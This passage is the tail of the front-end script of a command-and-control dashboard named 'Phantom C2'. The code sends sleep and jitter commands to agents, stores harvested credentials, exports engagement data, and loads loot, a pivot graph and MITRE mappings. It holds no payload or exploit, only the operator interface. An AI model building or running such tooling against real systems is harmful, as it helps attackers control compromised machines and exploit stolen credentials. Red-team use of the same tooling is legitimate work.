let lastAgentCount = 0;
function toggleNotifications() {
  if (!notificationsEnabled) {
    if ('Notification' in window) {
      Notification.requestPermission().then(p => {
        notificationsEnabled = p === 'granted';
        document.getElementById('notif-btn').style.opacity = notificationsEnabled ? '1' : '0.4';
      });
    }
  } else {
    notificationsEnabled = false;
    document.getElementById('notif-btn').style.opacity = '0.4';
  }
}
function notifyNewAgent(name, hostname) {
  if (notificationsEnabled && 'Notification' in window && Notification.permission === 'granted') {
    new Notification('Phantom C2 — New Agent', { body: name + ' (' + hostname + ') checked in', icon: '👻' });
  }
}

// ──── Keyboard Shortcuts ────
document.addEventListener('keydown', function(e) {
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') return;
  const pages = ['dashboard','agents','listeners','tasks','terminal','payloads','files','creds','events'];
  if (e.key >= '1' && e.key <= '9' && (e.ctrlKey || e.altKey)) {
    e.preventDefault();
    const idx = parseInt(e.key) - 1;
    if (idx < pages.length) {
      const btns = document.querySelectorAll('.sidebar-btn');
      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
      document.getElementById('p-' + pages[idx]).classList.add('active');
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      btns.forEach(b => b.classList.remove('active'));
      if (btns[idx]) btns[idx].classList.add('active');
    }
  }
  if (e.key === '/' && !e.ctrlKey) { e.preventDefault(); document.getElementById('term-input').focus(); }
});

// ──── Sleep/Jitter Control ────
async function updateSleep() {
  const agent = document.getElementById('agent-select').value;
  if (!agent) { alert('Select an agent first'); return; }
  const sleep = parseInt(document.getElementById('agent-sleep').value);
  const jitter = parseInt(document.getElementById('agent-jitter').value);
  if (!sleep || sleep < 1) { alert('Invalid sleep value'); return; }
  try {
    const resp = await fetch('/api/cmd', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({agent:agent, command:'sleep', args: sleep + ' ' + (jitter||0)})
    });
    const data = await resp.json();
    if (data.error) { alert(data.error); return; }
    termLog('system', 'Sleep updated to ' + sleep + 's / ' + (jitter||0) + '% jitter');
  } catch(e) { alert(e.message); }
}

// ──── Credential Manager (client-side store) ────
let credentials = JSON.parse(localStorage.getItem('phantom-creds') || '[]');

function showAddCred() {
  const form = document.getElementById('add-cred-form');
  form.style.display = form.style.display === 'none' ? 'block' : 'none';
}

function addCred() {
  const source = document.getElementById('cred-source').value.trim();
  const user = document.getElementById('cred-user').value.trim();
  const pass = document.getElementById('cred-pass').value.trim();
  const type = document.getElementById('cred-type').value;
  if (!user || !pass) { alert('Username and password required'); return; }
  credentials.push({source:source, username:user, password:pass, type:type, added:new Date().toLocaleString()});
  localStorage.setItem('phantom-creds', JSON.stringify(credentials));
  document.getElementById('cred-source').value = '';
  document.getElementById('cred-user').value = '';
  document.getElementById('cred-pass').value = '';
  renderCreds();
}

function removeCred(idx) {
  credentials.splice(idx, 1);
  localStorage.setItem('phantom-creds', JSON.stringify(credentials));
  renderCreds();
}

function renderCreds() {
  const table = document.getElementById('cred-table');
  if (!table) return;
  if (credentials.length === 0) {
    table.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--text-muted);padding:24px">No credentials stored. Add them manually or they\'ll appear as you harvest them.</td></tr>';
    return;
  }
  table.innerHTML = credentials.map((c,i) => {
    const typeColors = {password:'var(--green)',hash:'var(--yellow)',token:'var(--blue)',key:'var(--cyan)',cookie:'var(--accent-light)'};
    return '<tr><td>'+c.source+'</td><td style="font-weight:600">'+c.username+'</td>' +
      '<td style="font-family:monospace;font-size:12px">'+c.password+'</td>' +
      '<td><span style="color:'+(typeColors[c.type]||'var(--text-muted)')+';font-size:11px;font-weight:600;text-transform:uppercase">'+c.type+'</span></td>' +
      '<td style="color:var(--text-muted);font-size:11px">'+c.added+'</td>' +
      '<td><button class="qbtn" onclick="removeCred('+i+')" style="color:var(--red);font-size:10px;padding:3px 8px">✕</button></td></tr>';
  }).join('');
}

// ──── Export Engagement Data ────
async function exportData() {
  try {
    const agents = await fetchJ('/api/agents');
    const tasks = await fetchJ('/api/tasks');
    const events = await fetchJ('/api/events') || [];
    const data = {
      exported_at: new Date().toISOString(),
      framework: 'Phantom C2',
      agents: agents,
      tasks: tasks,
      events: events,
      credentials: credentials
    };
    const blob = new Blob([JSON.stringify(data, null, 2)], {type:'application/json'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = 'phantom-export-' + new Date().toISOString().slice(0,10) + '.json';
    a.click(); URL.revokeObjectURL(url);
  } catch(e) { alert('Export failed: ' + e.message); }
}

// ──── Theme Toggle ────
const presetOrder = ['dark','light','cobalt','mythic','hacker'];
let currentPresetIdx = 0;

function toggleTheme() {
  currentPresetIdx = (currentPresetIdx + 1) % presetOrder.length;
  applyThemePreset(presetOrder[currentPresetIdx]);
}
// Load saved theme
(function() {
  const saved = localStorage.getItem('phantom-theme-preset') || 'dark';
  const idx = presetOrder.indexOf(saved);
  if (idx >= 0) currentPresetIdx = idx;
  applyThemePreset(saved);
})();

// ──── Remove Agent ────
async function removeAgent(agentId) {
  if (!confirm('Remove this dead agent?')) return;
  try {
    const TOKEN = document.cookie.split('phantom_session=')[1]?.split(';')[0] || '';
    const resp = await fetch('/api/agent/remove', {
      method: 'POST',
      headers: {'Content-Type': 'application/json', 'Cookie': 'phantom_session=' + TOKEN},
      body: JSON.stringify({id: agentId})
    });
    const data = await resp.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    refreshAll();
  } catch(e) { alert('Error: ' + e.message); }
}

// ──── Init ────
loadAPIKeys();
loadTaskQueue();
loadPayloadHistory();
setInterval(loadTaskQueue, 8000);
// Load engagement notes
const notesEl = document.getElementById('engagement-notes-text');
if (notesEl) notesEl.value = engagementNotes;
renderCreds();
renderMitre();
loadTemplates();
loadAutoTasks();
loadAuditLog();
loadLoot();
document.getElementById('agent-select').onchange = onAgentSelect;
refreshAll();
setInterval(refreshAll, 4000);
setInterval(loadAuditLog, 10000);
setInterval(loadLoot, 15000);
setInterval(function(){ drawPivotGraph(); updateIOC(); }, 5000);
setTimeout(function(){ drawPivotGraph(); updateIOC(); }, 2000);
</script>
</body>
</html>`
